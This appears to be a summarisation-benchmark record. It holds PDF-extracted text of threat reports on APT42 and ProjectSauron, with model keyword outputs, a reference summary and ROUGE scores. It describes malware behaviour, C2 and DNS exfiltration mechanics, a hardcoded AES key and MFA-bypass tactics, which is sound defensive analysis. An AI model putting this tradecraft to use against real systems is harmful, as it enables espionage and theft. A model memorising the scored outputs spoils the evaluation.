from the Lab Dookhtegan Telegram account further allege these companies are responsible for threat activity aligned with UNC2448 and operate on behalf of the IRGC-IO.\u2022 Mandiant identified links between UNC2448, the Revengerspersona, an individual named Ahmad Khatibi, and a likely Iranian front company named Afkar System.\u2022 The Revengers persona had offered data and access toprimarily Israeli companies for sale on its Telegram channel between February and September 2021.\u2022 Additionally, infrastructure overlaps likely caused by humanerror indicate that UNC2448 has connections to a second front company, Najee Technology.\u2022 Public posts by the Lab Dookhtegan Telegram channel in July2022 claim Afkar System and Najee Technology are front companies conducting cyber operations on behalf of the IRGC\u2019s Intelligence Organization.AttributionMandiant assesses with high confidence that APT42 conducts cyber espionage operations on behalf of the Iranian government based on years of activity targeting unique, high-priority targets both inside and outside of Iran. Both Iran\u2019s Islamic Revolutionary Guard Corps and Ministry of Intelligence and Security have the mandate to conduct cyber espionage operations against the domestic populace and foreign targets of strategic intelligence value. However, we estimate with moderate confidence that APT42 operates on behalf of the Islamic Revolutionary Guard Corps\u2019 Intelligence Organization based on targeting patterns that align with the organization\u2019s operational mandates and priorities, which includes defending the regime against internal and external threats, pursuing perceived domestic enemies, and confronting \u201crevolutionary\u201d ideas emanating from the West.Historical Connections to APT35APT42 generally corresponds with activity other organizations have referred to as TA453 (Proofpoint), Yellow Garuda (PwC), and ITG18 (IBM). The group is also consistent with a sub-section of publicly reported threat clusters: Phosphorus (Microsoft) and Charming Kitten (ClearSky and CERTFA). Similarity in malicious cyber operations between various Iranian groups and a dynamic institutional ecosystem in Iran contributed to significant conflation of historical APT42 and APT35 activity.Mandiant assesses with moderate confidence that both APT35 and APT42 operate on behalf of the IRGC but originate from different missions and contracts or contractors based on substantial differences in their respective targeting patterns and tactics, techniques and procedures.\u2022 Historical APT35 operations focused on long-term,resource intensive operations targeting the U.S. and Middle Eastern military, diplomatic, and government personnel, organizations in the media, energy, and defense industrial base, and engineering, business services, and telecommunications sectors.\u2022 In contrast, APT42 operations focus on individualsand organizations of interest to the Iranian government for domestic politics, foreign policy, and regime stability purposes.\u2022 While both APT42 and APT35 have used MAGICDROP and BROKEYOLK malware, Mandiant observed no similarities between the respective C2 infrastructure or how the groups operationalized the malware.\u2022 The IRGC frequently relies on contractors to execute differentcyber operations mission sets (such as U.S. Treasury Department sanctions against Net Peygard Samavat).Outlook and ImplicationsAPT42 has consistently targeted the personal email credentials, Multi-factor authentication codes and mobile device location and communication data of individuals of interest to the Iranian government. They can use this access to enable follow-on compromises of corporate networks such as those of Western think tanks, academics, media organizations, biomedical research and pharmaceutical companies and governments. The group\u2019s surveillance activity highlights the real-world risk to individual targets of APT42 operations, which include Iranian dual-nationals, former government officials and dissidents both inside Iran and those who previously left the country, often out of fear for their personal safety.1 3We do not anticipate significant changes to APT42\u2019s operational tactics and mandate given the long history of activity and imperviousness to infrastructure take downs and a media spotlight on operational security failures. Nevertheless, the group has displayed its ability to rapidly alter its operational focus as Iran\u2019s priorities change over time with evolving domestic and geopolitical conditions. We assess with high confidence that APT42 will continue to perform cyber espionage and surveillance operations aligned with evolving Iranian operational intelligence collection requirements.Technical Annex: Attack Lifecycle1 4\u2022 CHAIRSMACK \u2022 Adding alternate email address to accounts \u2022 Deleting login noti\ufb01cation emails \u2022 Deleting sent emails \u2022 Windows Registry modi\ufb01cations\u2022 Accessing victim\u2019s personal email accounts \u2022 Spear phishing additional victims using a compromised accountMAINTAIN PRESENCEMOVE LATERALLYESCALATE PRIVILEGEINTERNALRECONNAISSANCE\u2022 CHAIRSMACK \u2022 Browsing victom\u2019s contacts \u2022 Synchronizing mail items \u2022 Taking screenshotsCOMPLETE MISSION\u2022 Credential theft \u2022 Obtaining \ufb01les from victim Sharepoint \u2022 Personal data theft \u2022 Phishing additional victims from compromised accountINITIAL COMPROMISEESTABLISH FOOTHOLD\u2022 Byoassing MFA \u2022 Credential theft \u2022 Credential harvesting forms \u2022 Patient social engineering \u2022 SMS messages for Android malware \u2022 Spear phishing\u2022 BROKEYOLK Authenticator applicationFIGURE 13. APT42 Attack Lifecycle.Initial Compromise APT42 primarily relies on spear phishing to perform an initial compromise. The group is patient and creative in their social engineering efforts, often engaging their target for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment to their correspondence. APT42 is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.\u2022 APT42 frequently impersonates well-known journalists or public figures ostensibly requesting interviews with their targets. In one instance, APT42 conversed with their target for 37 days before sending them a URL shortening link that redirected to a credential harvesting page.\u2022 APT42 sends spear phishing emails containing a PDFdocument attachment or links to Google Drive or Dropbox- hosted PDF documents with an embedded link to a credential harvesting page.\u2022 The group is capable of intercepting MFA authentication codesvia credential harvesting forms.Establish Foothold Once successfully authenticated to a victim\u2019s personal or corporate email account, APT42 registers their own Microsoft Authenticator application as a new MFA method. environments, APT42 uses a variety of primarily lightweight malware, some of which are based on publicly available scripts. Examples include:\u2022 BROKEYOLK\u2022 CHAIRSMACK\u2022 GHAMBAR\u2022 MAGICDROP\u2022 POWERPOST\u2022 PINEFLOWER\u2022 TABBYCAT\u2022 TAMECAT\u2022 VBREVSHELL\u2022 VINETHORNEscalate Privileges APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment. Examples include:Maintain Presence To maintain their presence in a victim\u2019s environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence, including:1 5\u2022 CHAIRSMACK\u2022 GHAMBARAdditionally, APT42 uses various techniques to maintain access to a victim\u2019s personal or corporate email account, including registering their Microsoft Authenticator application to receive MFA codes to their own devices. When APT42 sends spear- phishing emails from a compromised account or attempts to move laterally to a different account, the group deletes login notification emails and clears the messages from the Sent folder to cover their tracks.Complete Mission Mandiant assesses that APT42\u2019s objective is two-fold:\u2022 APT42 seeks to steal credentials to personal and corporate email accounts and use those credentials to conduct follow- on operations and steal personal or business documents and research pertinent to Iran.\u2022 APT42 seeks to track the locations, monitor the phone andemail communications and generally surveil the activities of individuals of interest to the Iranian government, including activists and dissidents inside Iran.We have no evidence to suggest APT42 hands harvested credentials to other threat actors for follow-on operations at this time.\u2022 CHAIRSMACK\u2022 DOSTEALER\u2022 GHAMBARInternal Reconnaissance After logging in to the target environment with stolen credentials, APT42 conducts internal reconnaissance by browsing the compromised user\u2019s contacts and accessing the targeted organization\u2019s collaborative spaces, such as Sharepoint. The group also logs in to compromised accounts with a Microsoft Outlook client, which can lead the existing mail items from affected users to be synchronized with the attacker\u2019s host. This access can be used to spear phish additional targets with legitimate, stolen content from the compromised organization or pre-existing email conversations.APT42 also uses malware capable of taking screenshots and collecting system and network information, including:\u2022 GHAMBAR\u2022 POWERPOSTLateral Movement To move laterally, APT42 often attempts to use the compromised personal email account of the victim to access other the victim\u2019s corporate accounts, and vice versa. The group sends spear- phishing emails from compromised email accounts to additional targets both internal and external to the targeted organization.\u2022 In April 2021, APT42 used a compromised corporate emailaccount of an employee at a U.S.-based think tank to access the individual\u2019s personal email account. The corporate account, configured as a recovery email, received login verification codes from the personal email provider, which APT42 deleted to cover their tracks.\u2022 On multiple occasions, APT42 used their victim\u2019s trusted relationships with their contacts to send additional spear- phishing emails to follow-on targets, including coworkers, industry peers and relatives.1 6Appendix 1. MITRE ATT&CK MappingTABLE 1. Resource Development.T1583.003T1584T1587.003T1588.004TABLE 2. Initial Access.T1133T1566.001T1566.002TABLE 3. Execution.T1047T1059.001T1059.005T1059.007T1569.002T1204.001T1204.002TABLE 4. Persistence.T1098.002T1133T1543.003T1547.001T1547.004TABLE 5. Privilege Escalation.T1055T1134T1543.003T1547.001T1547.004Acquire Infrastructure: Virtual Private ServerCompromise InfrastructureDevelop Capabilities: Digital CertificatesObtain Capabilities: Digital CertificatesExternal Remote ServicesSpear-phishing AttachmentSpear-phishing LinkWindows Management InstrumentationCommand and Scripting Interpreter: PowerShellCommand and Scripting Interpreter: Visual BasicCommand and Scripting Interpreter: JavaScript/JscriptSystem Services: Service ExecutionUser Execution: Malicious LinkUser Execution: Malicious FileAccount Manipulation: Exchange Email Delegate PermissionsExternal Remote ServicesCreate or Modify System Process: Windows ServiceBoot or Logon Autostart Execution: Registry Run Keys / Startup FolderBoot or Logon Autostart Execution: Winlogon Helper DLLProcess InjectionAccess Token ManipulationCreate or Modify System Process: Windows ServiceBoot or Logon Autostart Execution: Registry Run Keys / Startup FolderBoot or Logon Autostart Execution: Winlogon Helper DLL1 7TABLE 6. Defense Evasion.T1027.002T1027.005T1055T1070.004T1112T1134T1140T1221T1497.001T1497.003T1564.003TABLE 7. Credential Access.T1003T1111T1056.001TABLE 8. Discovery.T1012T1016T1082T1083T1087.001T1497.001T1497.003T1518Obfuscated Files or Information: Software PackingObfuscated Files or Information: Indicator Removal from ToolsProcess InjectionIndicator Removal on Host: File DeletionModify RegistryAccess Token ManipulationDeobfuscate/Decode Files or InformationTemplate InjectionVirtualization/Sandbox Evasion: System ChecksVirtualization/Sandbox Evasion: Time Based EvasionHide Artifacts: Hidden WindowOS Credential DumpingTwo-Factor Authentication InterceptionInput Capture: KeyloggingQuery RegistrySystem Network Configuration DiscoverySystem Information DiscoveryFile and Directory DiscoveryAccount Discovery: Local AccountVirtualization/Sandbox Evasion: System ChecksVirtualization/Sandbox Evasion: Time Based EvasionSoftware DiscoveryTABLE 8. Lateral Movement.T1021.001T1021.004Remote Services: Remote Desktop ProtocolRemote Services: SSH1 8TABLE 9. Collection.T1056.001T1113T1115T1123T1125T1213Input Capture: KeyloggingScreen CaptureClipboard DataAudio CaptureVideo CaptureData from Information Repositories: SharepointT1560.002Archive Collected Data: Archive via LibraryTABLE 10. Command and Control.T1071.001T1071.002T1095T1102T1105T1132Application Layer Protocol: Web ProtocolsApplication Layer Protocol: File Transfer ProtocolsNon-Application Layer ProtocolWeb ServiceIngress Tool TransferData Encoding: Standard EncodingT1573.002Encrypted Channel: Asymmetric CryptographicTABLE 11. Exfiltration.T1041TABLE 12. Impact.T1529Exfiltration over C2 ChannelSystem Shutdown/Reboot1 9Appendix 2. Malware Used by APT42TABLE 13. Malware used by APT42.MalwareBROKEYOLKCHAIRSMACKDOSTEALERGHAMBARMAGICDROPPINEFLOWERPOWERPOSTSILENTUPLOADERTABBYCATTAMECATVBREVSHELLVINETHORNDescriptionBROKEYOLK is a .NET downloader that downloads and executes a file from a hard-coded command and control (C2) server. The malware communicates via SOAP (Simple Object Access Protocol) requests using HTTP.CHAIRSMACK is a backdoor written in C++ that communicates using HTTP. CHAIRSMACK's core functionality involves expanding its capabilities by retrieving plugins from a C2 server. Downloaded plugins are cached on disk for future use. Capabilities added via plugins are inferred based on supported backdoor command names. These capabilities include shell command execution, screenshot capture, audio capture, keylogging, file transfer, and file execution.DOSTEALER is a dataminer that mines browser login and cookie data. It is also capable of taking screenshots and logging keystrokes.GHAMBAR is a remote administration tool (RAT) that communicates with its C2 server using SOAP requests over HTTP. Its capabilities include filesystem manipulation, file upload and download, shell command execution, keylogging, screen capture, clipboard monitoring, and additional plugin execution.MAGICDROP is a dropper written in C++. It decrypts files from its .data section and writes them to disk in the system's %TEMP% directory. The files dropped often include a decoy file, a next-stage payload, and sometimes an installer for the payload.PINEFLOWER is an Android malware family capable of a wide range of backdoor functionality, including stealing system inform information, logging and recording phone calls, initiating audio recordings, reading SMS inboxes and sending SMS messages. The malware also has features to facilitate device location tracking, deleting, downloading, and uploading files, reading connectivity state, speed, and activity, and toggling Bluetooth, Wi-Fi, and mobile data settings.POWERPOST is a reconnaissance tool written in PowerShell that can collect data on a local host including system information and user account names. POWERPOST writes the data to disk and then sends the collected data to a hardcoded remote server via HTTP POSTs.SILENTUPLOADER is an uploader written in MSIL that is dropped by DOSTEALER and is designed to work specifically in tandem with it. It checks for files in a specified folder every 30 seconds and uploads them to a remote server.TABBYCAT is a Microsoft Word VBA macro that functions as a dropper. It relies on social engineering in order to be executed as a macro within a decoy Microsoft Word document. It decodes a payload embedded in a UserForm and launches it. TABBYCAT has been observed dropping the VBREVSHELL backdoor.TAMECAT is a PowerShell toehold that can execute arbitrary PowerShell or C# content. TAMECAT has been observed dropped by malicious macro documents, communicates with its C2 node via HTTP, and expects data from the C2 to be Base64-encoded.VBREVSHELL is a VBA macro that spawns a reverse shell relying exclusively on Windows API calls.VINETHORN is an Android malware family capable of a wide range of backdoor functionality. It can steal system information, read SMS names are or may be trademarks or service marks of their respective owners. I-EXT-RT-US-EN-000454-01 ", "generated_text": "APT42; espionage; individuals; organizations; strategic interest; the Iranian government; at least 2015; the group; credentials; personal; corporate; personal email accounts; trust; rapport; their victims; their campaigns; Mobile malware; location; communications; video; photos; videos; images; SMS; C2 servers; Android malware; tools; credential harvesting; credential harvesting; credentials; information; other Iranian cyber espionage groups; Middle East; the Middle East; the group; a broad range; indicators; compromise; threats.", "ref_text": "<START-1>Here is a summary of the key points from the Mandiant report on the Iranian state-sponsored hacking group APT42: APT42 is a prolific Iranian cyber espionage group active since at least 2015. Mandiant assesses with moderate confidence they operate on behalf of the Islamic Revolutionary Guard Corps (IRGC). The group relies on highly targeted spear phishing to compromise accounts and mobile devices of individuals and organizations of interest to Iran. This includes government officials, journalists, academics, and dissidents. Once compromised, APT42 has deployed Android malware capable of location tracking, recording communications, and stealing SMS messages and images. APT42 focuses on building trust with targets before sending credential harvesting links or attachments. They often impersonate journalists over weeks before acting maliciously. The group has consistently targeted Western think tanks, the Iranian diaspora, and the personal accounts of government officials. Their targeting aligns with Iranian intelligence priorities. APT42 uses a range of custom malware in operations, including backdoors, keyloggers, and Android surveillance tools. Some tools reuse code from public GitHub repositories. The report provides technical details on APT42's tactics, known malware, infrastructure, targeting, and attributes them with high confidence to the Iranian government based on strategic alignment. <END-1>", "t5/keyword/hint_hit_precision": 0.4358974358974359, "t5/word/hint_hit_recall": 0.12307692307692308, "gpt3/lexical/rouge_rouge1": 0.5125, "gpt3/lexical/rouge_rouge2": 0.18238993710691823, "gpt3/lexical/rouge_rougeL": 0.25625, "gpt3/lexical/rouge_rougeLsum": 0.25625, "gpt3_generated_text": ["The Threat Intelligence Report on APT42 reveals that the Iranian state-sponsored cyber espionage group has been active since at least 2015, targeting individuals and organizations of strategic interest to the Iranian government. APT42 employs highly targeted spear phishing campaigns to gain access to personal and corporate email accounts, building trust and rapport with their victims. The group also deploys mobile malware for surveillance, tracking victim locations, monitoring communications, and extracting data. APT42 has targeted a broad range of sectors and organizations in at least 14 countries, with a focus on opponents or enemies of the regime. The group adapts its operational focus as Iran's priorities evolve, showcasing a high operational tempo and an ability to evade public reporting and infrastructure takedowns."]}, {"split_name": "val", "sample_id": "val_27", "prompt_text": "Extract the keywords: THE PROJECTSAURON APT. the name \u2018RPCHlpr\u2019 and only continues to run in case when the process token contains a \u201cS-1-5-6\u201d (Service) sid.The module spawns one thread, creates a named pipe \u201c\\\\.\\pipe\\rpchlp_0\u201d, and waits for connections to that pipe. Once a connection occurs, it creates another thread to carry out communication. Then it receives a 8- byte rc4 key and body of a command to run. Next it creates three pipes, \u201c\\\\.\\pipe\\rpchlp_1\u201d, \u201c\\\\.\\pipe\\rpchlp_2\u201d and \u201c\\\\.\\pipe\\rpchlp_3\u201d for standard file handles (stdin, stdout, stderr) and waits for all these pipes to connect.Depending on the command received, it may either execute the shellcode or start a process with the given command line and redirects RC4-encrypted input/output from all the handles from/to the sender.Standard blobThe shellcode blob is expected to start with a magic value \u201c0xC102AA02\u201d (DWORD). The blob format is the 00 DWORD magic \u201c0xC102AA02\u201d 04 BYTE version 2 05 BYTE version minor \u2013 any 06 DWORD offset of entrypoint 0A DWORD blob size Executable blobs of the described format are used in many components of the malicious platform and are referred in the description as \u201cstandard blobs\u201d.Passive sniffer backdoorFormat: PE DLL 32/64 bit File sizes: 75 \u2013 91 KbFor any inquiries, contact intelreports@kaspersky.comPage 2 of 33The ProjectSauron APT. Technical analysisCompilation timestamps, linker versions: multiple variant, but match those of the target OS files (usually \u201csvchost.exe\u201d).The module is known to be installed as either an LSA password manager library, or as a Security Provider.The business logics is provided by one of the exported functions and is triggered when the corresponding system layer loads the library. When invoked, the module decrypts the first layer from the blob that contains actual code. The blob happens to have the same format as the RPC Helper payload. Once the magic value and code boundaries are verified, the code invokes the shellcode from the blob.The shellcode removes subsequent layers of encryption and decompresses its payload using the Jcalg1 algorithm. The payload contains another layer of shellcode that loads, relocates and invokes the PE binary inside. The configuration consists of 1-3 DLL files, the first one being the main module and 1-2 others are optional plugins.The main module starts by enumerating all available plugins and starting them by calling the function exported by the name \u201cainit\u201d. Every plugin provides a pointer to its own function table to the calling core.The configuration provided by the \u201cupper\u201d layer of the shellcode also contains the names of the event and mutex objects that are created by the core \u2013 these are usually unique for each sample.Then, it locates its configuration data in the resource called \u201cCONFIG\u201d of type \u201cRT_CONFIG\u201d. The resource is encrypted using AES-CBC with a hardcoded key \u201cEFEB0A9C6ABA4CF5958F41DB6A31929776C643DEDC65CC9B67AB8B0066FF2492\u201d.The key is not encrypted and can be located in the memory of the target processes while the module is running.The configuration is in readable text format. It is separated into sections that refer to different plugins by headers starting with ':'. Every option contains a prefix that specifies its format \u2013 S (string), B (boolean), 'I', 'D', 'N' (integer), 'E' (list):Core [S]Public Key=\"ul35zkT/MGP3poQe+enL0dZef5rkaQtaZ78rn2qCsJjB45TCsSG26Qhz9lTtucKGpAqxmB5ByUOMsENKQL1twZm8zuxxfOIViGnj a0Yr49v8SlS9vCD/wibjo/0ri4c9JH80h5z3EWfXKIAmdgKRuCQXgiORBz4TFx1C+MRt0bzOYsM+kzuRsvUhmKPkL6iVAwpic1LGMH5S kMeWmtHbWYpOL+3U70YeHgFCKjWuhy9Nmt36EWZLKzZitjvYFq8EJ3QfpoMB+oWa9OhOlde2+9zOeTYPwGUq9t/oQwlXXTnfA7 HkSVcvuoo+E//gzPJ/wT6Xq82IlsqB/IznIeaZaQ==\" [S]Process List=\"svchost.exe:*netsvc*,spoolsv.exe:*\" [B]Monitor Child Thread=false [B]Disable Master Execute=false :Raw [B]Any Dest=false :Icmp the module creates a socket and starts a new thread to monitor routing and IP changes. Finally, it starts every plugin, providing pointer to own function table.For any inquiries, contact intelreports@kaspersky.comPage 3 of 33The ProjectSauron APT. Technical analysisOnce a network packet is received by a plugin, it pushes the packet to the core and tries to decrypt the packet header with RC5 using the public key. If the first dword matches 0x11111111, it decrypts the rest of the packet, verifies the CRC32 and appends it to the queue.The packet is expected to be a command, either providing the core plugin with the address of the C&C server to connect to, the local port number to listen to, or the path to the additional local module to load and start. Depending on the command received in a packet, the module can:Execute an arbitrary binary from diskLoad and start an encrypted plugin from diskSpawn a network connection objectThe plugin on disk is encrypted with RC6 with a 64-bit key that is provided by the C&C server. The decrypted and decompressed blob is expected either to be a valid PE file or a standard blob.Plugin: \u201cRaw\u201dMD5: many, irrelevant Size: 25 Kb Format: PE32/64 DLL The packet handler processes IP packets of protocols: ICMP, IGMP, UDP, TCP.The plugin extracts the contents from the incoming packets according to the corresponding protocol specification. For ICMP packets, it only passes those of type 8 (echo request). No additional checks are performed and since the payload is encrypted with an arbitrary key using RC5 it can be only filtered out by high entropy values in the payload.Plugin: \u201cIcmp\u201dMD5: many, irrelevant Size: 11 Kb Format: PE32/64 DLL The plugin processes incoming ICMP packets using a raw socket object. The module verifies that the packet type is either 0 (echo reply) or 8 (echo request). If the ICMP type matches, it skips the ICMP header and passes the rest of the packet to the core.Plugin: \u201cPcap\u201dMD5: many, irrelevant Size: 24 Kb Format: PE32/64 DLLFor any inquiries, contact intelreports@kaspersky.comPage 4 of 33The ProjectSauron APT. Technical analysisThe plugin tries to open the \\Device\\NdisRaw device. If failed, it enumerates all loaded drivers using undocumented parameter 11 of NtQuerySystemInformation and checks if \u201cnps.sys\u201d (network packet filter) is loaded. After this, it resolves the API of \u201cpacket.dll\u201d. Another mode of operation is to start the \u201cNPF\u201d service and work via NdisRaw device. In that case it provides wrappers to emulate the API of \u201cpacket.dll\u201d.The plugin expects to receive IPv4 packets of no more than 1514 bytes. The only difference from \u201cRaw\u201d in further processing is that it supports only ICMP echo request, UDP and TCP packets.There are monolithic versions of the passive backdoor that contain all the \u201cplugins\u201d inside the main binary the UDP header. All such packets are accepted, decrypted and validated for the magic value. It uses the same API as the \u201cpcap\u201d plugin.The \u201cPcapTcp\u201d is similar, it waits for incoming TCP packets and inspects data that follows the TCP header. The packet is expected to be of size between 0x76 and 0x1A5 bytes and should not be a broadcast packet.Plugin: \u201cDns\u201dThis plugin acts according to a predefined schedule. The \u201cPoll Times\u201d parameter specifies the specific time when the plugin should try connect to its C&C server. Format: \u201cday_of_month/hour:minute, \u201d. There can be up to 31 such entries. If current time matches one from the \u201cPoll Times\u201d list or \u201cPoll on Start\u201d was set to \u201ctrue\u201d.First it resolves the hostname specified by the \u201cStart Marker\u201d value. Then it only continues if the name was resolved and the returned IP address is equal to the one specified in the \u201cStart Marker\u201d second part. It forms the full DNS name to resolve by replacing the \u201c%d\u201d mark in the \u201cAddress Format\u201d with \u201c1\u201d and then \u201c2\u201d etc until the total packet size is less than 0x11B bytes. The sum of received data is expected to be eq or more than 0x40 bytes.Plugin: \u201cPipe\u201dThe plugin looks for the option \u201cPipe Name\u201d in the Core configuration, which is used as \u201c\\\\.\\pipe\\%value%\u201d for creating a pipe object. Then it waits for incoming connections to the named pipe, reads packets of size 287 bytes and processes them as any other packet obtained by plugins.For any inquiries, contact intelreports@kaspersky.comPage 5 of 33The ProjectSauron APT. Technical analysisPlugin: \u201cHttp\u201dThis plugin acts according to a predefined schedule. The \u201cPoll Times\u201d parameter specifies the specific time when the plugin should try to connect to its C&C server, up to 31 such entries.It uses the default system User-Agent string or a default fallback value: \u201cMozilla/4.0 (compatible; MSIE 6.0; Win32)\u201d. It also sends the following HTTP additional headers:Accept: text/html,text/plain,*/* Accept-Language: en-us Accept-Charset: ISO-8859-1,* Keep-Alive: 300 Connection: Keep-Alive Cache-Control: No-CacheIf proxy parameters are set, it uses them for sending the request. Sends a HTTP GET request to a given URL using Wininet API. The payload is extracted from the response using the \u201cStart Mark\u201d and \u201cEnd Mark\u201d strings, and then Base64-decoded.Generic pipe backdoorsA set of executables that are usually delivered over the local network using legitimate remote administration tools from other compromised computers.Samples:MD5SizeFormat BitsLinkerCompilation Windows executables. When started without parameters, the module copies itself to the %TEMP% directory and schedules the execution of its copy with parameter \u201c-q\u201d by creating a new scheduler task.When run with one parameter, the module proceeds with its actions. It sets up a hardcoded 64-byte RC4 key, connects to a remote peer using a hardcoded IP address (local or external) and hardcoded port (different for each sample). Then it sends encrypted packet of 0x10 bytes starting with magic numbers, and expects to receive a payload in specific format, starting with magic numbers as well.If the payload is successfully received from the server, it is called by the provided entry point offset. The shellcode is provided with pointers to API functions \u201cGetProcAddress\u201d and \u201cLoadLibraryA\u201d and the handle of values provided from the command line, and it does not copy itself or schedule a job, it just runs in place, timestamp2013.01.04 05:33:212015.02.24 09:46:022015.02.24 09:46:022015.08.25 10:20:402015.10.01 18:04:262015.12.14 15:06:11The package is wrapped in a PE module that activates the standard blob. It usually contains the binary and the configuration file. The configuration file contains: the pipe name, the 2048-bit RSA public key and exponent.The module [HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters] NullSessionPipesprovidedcreatespipeusinganameanamedintheconfig:If the values does not contain the name of the pipe provided in the config, it appends it to the list and updates the registry value.Then it creates the pipe \\\\.\\PIPE\\%pipe_name% and waits for incoming connections on the pipe.Once an incoming connection is accepted, it performs a key exchange based on the RSA key provided by the configuration, and using two hardcoded 16-byte \u201cmagic\u201d strings as challenge-response markers. After the timestamp2009.07.13 23:31:132009.07.13 23:31:132009.07.13 23:31:132009.07.13 23:31:132009.07.14 01:03:452009.07.14 01:24:442009.07.14 01:24:442009.07.14 01:24:442009.07.14 01:24:44This module employs a different kind of encryption by using a custom virtual machine for decrypting its payload. The final artefact of decryption is a standard blob that is then started as usual. The configuration data in the shellcode is also stored in a unique format of several encrypted records.The blob contains the actual Trojan component. The configuration blob consists of two records: the first one is the actual config data including the C2 URL, and the second is another standard blob that has a special deinstallation library and its own configuration data inside.The configuration contains the following data:0x1010x1020x301RSA keyExponentFormat string for a file name. Its default value is \"C:\\System Volume Information\\%VID%\", where the \"%VID%\" part is then replaced by a GUID-like representation of the parts of the RSA key.0x8280 \u2013 0x9000 (step 0x100)C&C URL configurationFor any inquiries, contact intelreports@kaspersky.comPage 8 of 33The ProjectSauron APT. Technical analysisThe module collects basic information about the system and sends HTTP POST requests to one of the C&C servers specified in the configuration blob. The encrypted response from the server should contain a valid PE DLL file that has an exported function called \u201cinit\u201d. Once such response is received, the module calls the exported function.The deinstallation DLL is accompanied by its own configuration file listing the files to be deleted:0x101, 0x102 Names of event objects to wait for0x1030x201+Guid-like filename (see 0x301 in the previous description) to be deletedLocations of files to deleteCore platform (LUA VFS)Samples:MD5SizeFormat BitsLinkerCompilation backdoor module. The DLL versions provide the similar interface mimicking an LSA password filter, or as a Security Provider.It decrypts the standard blob that consists of two parts: the orchestrator binary and the configuration blob. The configuration blob is a virtual filesystem that contains all binary plugins required for executing a particular task. It may include other standard blobs containing other execution scripts. The last item of the VFS is always a precompiled Lua script that instructs the core what to do.The VFS is encrypted with RC4 or Salsa20 (depending on the version of the platform) and compressed with Zlib.The orchestrator executes the Lua script using embedded runtime and provides basic functions to the script. The original Lua interpreter was modified: the version embedded in the platform uses unicode (utf-16) encoding for storing string values and variable names.The execution flow is controlled by the script. External plugins are DLL libraries, they are referenced by name. The provided interface emulates console applications: they have emulated stdin/stdout/stderr, the input data is provided as command-line parameters and input streams. Output can be chained by a standard shell operator \u201c|\u201d to be fed into another program. Overall flow looks like a shell script. The \u201cexec\u201d and \u201cexec2str\u201d commands support basic redirection operators (\u201c>\u201d, \u201c>>\u201d, \u201c<\u201d, \u201c|\u201d).Modules provided by the Lua runtime:table wAll the modules except \u201cw\u201d are standard for LUA. The module \u201cw\u201d is custom, it implements the following specific commands:argscdcreate_logdebugfdrop_tokenexecexec2strexitfrontendget_idGet the argumentsChange current directoryInitialize a new encrypted log object (on disk or in memory)Call OutputDebugStringW()Close handle to some objectExecute a plugin, results are stored in the logExecute a plugin, return the result as stringStop executionReturn the value of an internal variableReturn the value of an internal variableFor any inquiries, contact intelreports@kaspersky.comPage 10 of 33The ProjectSauron APT. Technical analysisget_mem_logget_log_infoget_proc_bitsGet the contents of the current in-memory log storageGet the status of the current log storageReturn hardcoded value (32, 64)get_windows_bitsReturn whether OS is 32-bit or 64-bitload_statemessageboxprintfpwdrandgenrandstrrandrangesave_stateLoad execution state from a file or from the registryShow a standard message boxWrite to the emulated stdout streamReturn the current working directoryReturn a buffer full of random dataReturn a random alphanumeric stringReturn a random value that is bound by a given rangeSave execution state in a file or from the registryshutdown_detectedReturn 1 if the OS is shutting downSet internal parameter's value by nameDelayAttach to the encrypted log storageDetach from the current encrypted log storagesetsleepstart_logstop_logPluginsThe rest of the functionality is provided by the plugins. Most of the plugins contain a full description of its purpose and available command line keys that can be printed if no parameters were specified, or if requested by using a \u201c/?\u201d, \u201c-?\u201d, \u201c/h\u201d command line parameter. These descriptions (if present) are presented as-is.VFS namearppingattribDescription (original, when present)ARP scanner -r Resolve hosts that answer. -l Print only replying Ips. -m Do not display MAC addresses.Displays or changes file attributes ATTRIB [/S][+R | -R] [+A | -A ] [+S | -S] [+H | -H] [drive:][path] + Sets an attribute. - Clears an attribute. R Read-only file attribute. A Archive file attribute. S System file attribute.For any inquiries, contact intelreports@kaspersky.comPage 11 of 33The ProjectSauron APT. Technical analysisbasexblobcatcopydeldetachdextH Hidden file attribute. [drive:][path]<filename> Specifies a file or files for attrib to process. /S Processes matching files in the current folder and all subfolders.Base 64/32/16 en/de-coder [-b <base>] [-d [-f]] [-h] Options: -b base 64, 64url, 32, 32url or 16. Default is 64 -d Decode data. Default is to encode -f Force decoding when input is invalid/corrupt -h This cruft Uses standard in/out. See man page for examples. Additional blob that should be decoded and loaded, usually contains another copy of the orchestrator and its own VFSDisplays the contents of file(s) cat [options] {file(s) | - | @- Options: -b <lines> Display only the first <lines> lines (head). Can not be used with -t option. -t <lines> Display only the last <lines> lines (tail). Can not be used with -b option. -e Display $ at end of each line. -n Number all output lines. -N Print a header containing the file name. -F Print full path in header. -s Never more than one single blank line. -f Follow output. With no FILE, or when FILE is -, read standard input. If the - is prepended with a @, stdin is a list of files.Copy files or directories on diskDelete files or directoriesRun blobs in the background Usage: list Show running blobs start <file> [[pid/name] [\"args\"]] Start running a blob stop <id> Stop a running blob wait <id> <timeout> Wait for a blob to finishDNS Exfil Tool -a Assemble rows of DNS names back to a single string of data -f Force - removes checks of DNS names and lengths (during split)For any inquiries, contact intelreports@kaspersky.comPage 12 of 33The ProjectSauron APT. Technical analysisdinstdirand missing/wrapped data (during assembly) -l length Specify length of data part of suffix (default and max is %d) -r Randomize data lengths (length/2 to length) -h This cruft Suffix format: domain.com See man page for examples. Takes the input string on the stdin stream and generates a sequence of subdomain names to be resolved for actual exfiltration. The list is written to the stdout stream. The DNS resolution is expected to be performed by another tool.Display installed applications Options: -v Display additional information. -p Display product patches.Displays files and subdirectories dir [options] [drive:][path][filename] Options: -A[-]x Displays files with specified attributes. attribs D Directories R Read-only files H Hidden files A Files ready for archiving S System files P Reparse points E Encrypted files - Prefix meaning not -B Uses bare format (no heading information or summary). -E Checks that specified paths exists (disables pattern matching) -F Force display of full path. -C Do not display the thousand separator in file sizes. -O[-]x List by files in sorted order. orders N By name (alphabetic) S By size (smallest first) E By extension (alphabetic) D By date/time (oldest first) G Group directories first - Prefix to reverse order -S Recursive directory listing. -Tx Controls which time field displayed or used for sorting. fields C Creation A Last Accessed M Last Modified -X Use the short names generated for non-8dot3 file names. If no short name is present the normal name is displayed. -da<DATE> Only show files later than <DATE> 